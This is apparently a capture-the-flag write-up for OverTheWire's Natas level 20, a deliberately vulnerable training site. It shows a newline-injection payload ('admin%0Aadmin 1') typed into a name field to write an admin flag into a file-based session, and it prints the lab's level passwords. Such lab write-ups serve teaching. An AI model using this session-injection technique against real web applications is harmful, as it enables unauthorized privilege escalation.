# Natas Level 20 → Level 21

## 🚩 Challenge Info

- **Platform:** OverTheWire – Natas Wargame  
- **Level:** 20 → 21  
- **Category:** Web Security / Session Injection (File-Based Sessions)  
- **URL:** http://natas20.natas.labs.overthewire.org  
- **Username:** `natas20`  
- **Password:** `VbM0p7xH2nZQ9rF3yW5sT8kL1cD6aJ4E`

---

## 🎯 Objective

Find the password for **natas21** by exploiting **session handling vulnerabilities** and injecting malicious session data.

---

## 🔍 Observations

The page contains a simple form:

- Input: **name**
- Button: **Change name**

After submitting a name, the page displays:
```
Your name is: <input>
```
### 1. Session Behavior

The application stores user input in **session files** on the server.

From prior levels, we know:
- Sessions may be stored in `/tmp` or similar directories
- Data is stored in a **key=value format**

---

## 🛠️ Investigation
### 1. Understanding the Vulnerability

The application stores session data like:

name=<user_input>

Since input is not properly sanitized, additional session variables can be injected.

### 2. Exploitation
**Payload Used:**
```
admin
admin 1
```
Or URL-encoded:
```
admin%0Aadmin 1
```
**Result**

After submission, the session file contains:
```
name=admin
admin 1
```
This may be interpreted as:
```
admin=1
```
**Steps to Reproduce**
- Enter the payload in the name field
- Submit the form
- Refresh the page

---
## 💡 Discovery
```
The application treats the user as admin and reveals:
natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
```